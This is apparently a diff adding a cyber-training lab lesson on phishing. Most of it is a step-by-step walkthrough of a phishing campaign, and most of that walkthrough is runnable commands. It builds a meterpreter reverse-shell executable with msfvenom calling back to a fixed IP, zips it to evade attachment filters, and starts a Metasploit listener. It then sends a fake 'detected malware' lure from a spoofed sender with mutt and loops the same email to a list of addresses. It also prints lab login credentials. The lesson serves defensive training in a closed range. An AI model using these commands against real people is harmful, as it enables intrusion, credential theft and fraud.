@@ -1,0 +1,420 @@
+################ Mod 16 Lesson 1 ################
+######### Phishing Attacks and Defenses #########
+Phishing Follow-On Actions
+Once the attacker successfully deceives the victim, follow-on actions typically include:
+
+﻿
+
+Gathering Data
+﻿
+
+This attack does not deliver a payload in a technical sense. Victims divulge sensitive information, such as social security numbers, bank account numbers, and other PII. This can result in identity theft for the victim.
+
+﻿
+
+Harvesting Credentials
+﻿
+
+Credential harvesting can be considered a subset of data gathering. Attackers attempt to gather login credentials, which could allow for follow-on attacks. A common phishing attack involves notifying users that their credentials were compromised, and to change their password by clicking on a link in the email. The link takes the victim to a site that impersonates the site’s login page. When users enter their credentials, the attacker collects them.
+
+﻿
+
+Executing Code
+﻿
+
+An attacker may want more functionality after they successfully compromise a victim’s machine, which they can achieve via running their own specific code or running commands. If desired, they can deliver an exploit depending on the software, and/or drop a payload, if no exploit was needed (run reconnaissance surveys, etc.).
+
+﻿
+
+Advanced Persistent Threat (APT) 28, or FANCY BEAR, is a Russian nation-state actor that has utilized phishing messages using spoofed websites to harvest credentials against their targets of interest in the US and Western Europe. Additional information on APT28 can be found here: https://attack.mitre.org/groups/G0007/.
+
+﻿
+
+Conducting a Phishing Campaign
+﻿
+
+Conduct a simple phishing campaign to gain insight into how one might be performed. Use the popular Mutt command line email client to send phishing emails with a standard meterpreter executable as the payload. Carry out a mass mailing campaign once they are successful with the requisite tasks.
+
+﻿
+
+Workflow
+
+﻿
+
+1. Log in to the cda-kali-hunt Virtual Machine (VM) using the following credentials:
+
+﻿
+
+Username: trainee
+Password: Th1s is 0perational Cyber Training!
+﻿
+
+2. Open Terminal Emulator from the menu bar.
+
+﻿
+
+﻿
+
+Figure 16.1-2
+
+﻿
+
+Postfix, an SMTP server, is preinstalled and preconfigured on the cda-kali-hunt machine. The purpose of having a local mail server is to control certain elements of the email header without getting rejected from the SMTP server.
+
+﻿
+
+3. Run the following commands:
+
+﻿
+
+$ sudo systemctl status postfix
+$ sudo ss -lptn
+﻿
+
+These commands verify that the Postfix service is functional. The first command queries the status of Postfix from systemd, which is active.
+
+﻿
+
+﻿
+
+Figure 16.1-3
+
+﻿
+
+The second command checks the socket status of listening Transmission Control Protocol (TCP) ports (-l -t), shows the associated process (-p), and does not perform name resolution on the port numbers (-n). Since the SMTP port is open (port 25), the local server is ready to send mail.
+
+﻿
+
+﻿
+
+Figure 16.1-4
+
+﻿
+
+4. Create a malicious payload in MsfVenom:
+
+﻿
+
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=199.63.64.51 LPORT=4444 -f exe-small -o attachment.exe
+﻿
+
+The options used in this command are:
+
+-p: Specifies the desired payload. Since the target(s) in this domain are Windows 10 workstations, the appropriate payload is the 64-bit windows reverse TCP payload. The reverse_tcp payload has the benefit of being better at circumventing end user host and network firewalls since the connection is initiated by the end user’s host device.
+LHOST: This is the address that the exploited device calls back to.
+LPORT: This is the port that the exploited device calls back to.
+-f: This is the file format of the created payload. exe-small creates small Windows-compatible payloads.
+-o: This option specifies the output file: attachment.exe.
+﻿
+
+﻿
+
+Figure 16.1-5
+
+﻿
+
+5. Zip up the payload by running the following command: 
+
+﻿
+
+$ zip attachment.zip attachment.exe
+﻿
+
+The above command takes attachment.exe (created in MsfVenom) and compresses it into a zip archive — attachment.zip. Many organizations have settings configured that reject messages with executables attached to them. Zipping the file may circumvent these controls in many circumstances. However, many organizations are now blocking email messages containing Zip file attachments.
+
+﻿
+
+﻿
+
+Figure 16.1-6
+
+﻿
+
+Before sending the phishing email, start a listener to catch the callback from the end user’s host machine.
+
+﻿
+
+6. Open a new terminal window, and run the following command to access the Metasploit console:
+
+﻿
+
+$ msfconsole
+﻿
+
+﻿
+
+Figure 16.1-7
+
+﻿
+
+7. Run the following command once the console loads:
+
+﻿
+
+use multi/handler
+﻿
+
+﻿
+
+Figure 16.1-8
+
+﻿
+
+8. Set the payload parameter to match the payload used earlier. View the associated options used with this payload.
+
+﻿
+
+set payload windows/x64/meterpreter/reverse_tcp
+show options
+﻿
+
+﻿
+
+Figure 16.1-9
+
+﻿
+
+The parameters associated with the payload are EXITFUNC, LHOST, and LPORT. EXITFUNC defines the exiting behavior of the payload (i.e., the process terminates on the end user device when the payload completes execution). The default setting is fine in this case. The LHOST option specifies which interfaces on the cda-kali-hunt VM listen for callbacks. This needs to be set to 0.0.0.0, or all available interfaces on the cda-kali-hunt. The LPORT defaults to 4444, which was used in Step 4 with MsfVenom, so the default value does not need to be changed.
+
+﻿
+
+9. Set the listening host by running the following commands:
+
+﻿
+
+set LHOST 0.0.0.0
+show options
+﻿
+
+﻿
+
+Figure 16.1-10
+
+﻿
+
+10. Verify that everything is correct, and run the following command to start the listener as a job:
+
+﻿
+
+run -j
+﻿
+
+﻿
+
+Figure 16.1-11
+
+﻿
+
+With the listener receiving a callback, finish crafting the phishing email.
+
+﻿
+
+11. Switch back to the other open terminal, and create a message used as the email body. Incorporate some indicators of phishing in the message.
+
+﻿
+
+$ echo 'This is your company administrator. Malware has been detected on your computer. Use the attached zip file to remove the virus immediately!' > message.txt
+﻿
+
+The command above takes the provided string and redirects the output into a file named message.txt.
+
+﻿
+
+﻿
+
+Figure 16.1-12
+
+﻿
+
+12. Send the email with the attachment using the following command:
+
+﻿
+
+$ mutt -e 'my_hdr From:admin <admin@cda.com>' -s "DETECTED MALWARE!" phishme@cda.com -a attachment.zip < message.txt
+-e: Specifies a configuration option. This command spoofs the administrator’s email address by changing the contents of the From field.
+-s: Subject line of the message
+-a: Specifies a file to attach.
+phishme@cda.com: The recipient and the target of the attempted phish.
+< message.txt: Redirects the contents of message.txt into the command, which sets the contents of the file as the message body.
+﻿
+
+13. Log in to the cda-acct-1 VM using the following credentials:
+
+﻿
+
+Username: trainee
+Password: Th1s is 0perational Cyber Training!
+﻿
+
+14. Open Google Chrome from the desktop, and select Outlook Web App from the bookmarks. Select Advanced > Proceed to cda-mail.corp (unsafe) when the certificate warning appears.
+
+﻿
+
+NOTE: This appears because the Public Key Infrastructure (PKI) is not configured in range. In turn, the certificate authority that signed the mail server’s certificate is not trusted by cda-acct-1.
+
+﻿
+
+﻿
+
+Figure 16.1-13
+
+﻿
+
+15. The Phishme user must log in to the webmail portal to access their inbox. Enter the following credentials when prompted:
+
+﻿
+
+Username: cda\phishme
+Password: Th1s is 0perational Cyber Training!
+﻿
+
+﻿
+
+Figure 16.1-14
+
+﻿
+
+16. Select the only email in the inbox.
+
+﻿
+
+﻿
+
+Figure 16.1-15
+
+﻿
+
+Notice that the email appears to come from a legitimate user within the CDA domain.
+
+﻿
+
+NOTE: There are two domains configured in this network: CDA.CORP and CDA.COM. Microsoft recommends having an internal domain and an external Domain Name System (DNS) for security purposes, a practice known as split-brain DNS. For example, users on the internet should not be able to see the names and addresses of domain controllers on the intranet. The internal domain is for devices that should be resolvable by name within the intranet, and the external domain is resolvable by name via the public internet. Both domains are valid for the users in the CDA network in this case, however, the CDA.CORP domain is only resolvable from within the network.
+
+﻿
+
+17. Select the attachment in the email to download it. Once the download completes, open the downloaded file.
+
+﻿
+
+﻿
+
+Figure 16.1-16
+
+﻿
+
+18. Run the executable inside the Zip file; the file does not need to be extracted.
+
+﻿
+
+﻿
+
+Figure 16.1-17
+
+﻿
+
+19. Select Run if a security warning appears.
+
+﻿
+
+﻿
+
+Figure 16.1-18
+
+﻿
+
+20. Switch back to the cda-kali-hunt VM. A new meterpreter session is presented.
+
+﻿
+
+﻿
+
+Figure 16.1-19
+
+﻿
+
+21. View sessions with the sessions command. Interact with the created session by entering the command:
+
+﻿
+
+sessions -i 1
+﻿
+
+﻿
+
+Figure 16.1-20
+
+﻿
+
+22. To see what user meterpreter is running under on the exploited system, run the following command:
+
+﻿
+
+getuid
+﻿
+
+﻿
+
+Figure 16.1-21
+
+﻿
+
+Since the user was the one that started the meterpreter process, the privileges the attacker has are those of the user that started the process. In this case, the user is cda\trainee. The attacker has initial access at this stage; follow-on actions would likely be to privilege escalate to gain more robust access to the machine.
+
+﻿
+
+23. Exit the session.
+
+﻿
+
+exit
+﻿
+
+24. For mass mailer attacks, loop through the mail command with a list of provided emails. In a terminal on the cda-kali-hunt VM, open a Vim editor (or any text editor), and create a file named emails.txt. The contents of the file should be these emails separated by line. Save the file.
+
+﻿
+
+$ vim emails.txt
+﻿
+
+patti.mcclure@cda.com
+stevie.roach@cda.com
+camron.smith@cda.com
+leonard.blevins@cda.com
+mikaela.rubio@cda.com
+jess.whitney@cda.com
+andrew.oconnor@cda.com
+philip.holt@cda.com
+madelyn.rodriguez@cda.com
+﻿
+
+﻿
+
+Figure 16.1-22
+
+﻿
+
+Typically, this is when the listener starts again to catch any potential callbacks, but this will not be activated during this step. The purpose of this step is to simply simulate a mass mailer.
+
+﻿
+
+25. After the emails.txt file is created, run the following one-line Bash command in the terminal to send emails to all users in the file:
+
+﻿
+
+$ for email in $(cat emails.txt); do mutt -e 'my_hdr From:admin <admin@cda.com>' -s "DETECTED MALWARE!" $email -a attachment.zip < message.txt; done
+﻿
+
+This command is a simple Bash script that uses a Bash for loop to run the same mutt command run earlier on each email. The for loop sends the emails individually to each user, which prevents the recipients from seeing other recipients in the email headers. An alternative option method is using the Blind Carbon Copy (BCC) field to not have a loop, which achieves the similar functionality. However, some mail clients still show signs that there were other recipients on the email.
+
+﻿
+
+26. Verify that the emails were sent successfully by checking the mail log for a successful entry:
+
+﻿
+
+$ sudo grep "status=sent" /var/log/mail.log
+﻿ ﻿ ﻿
+
+﻿
+
+Figure 16.1-23
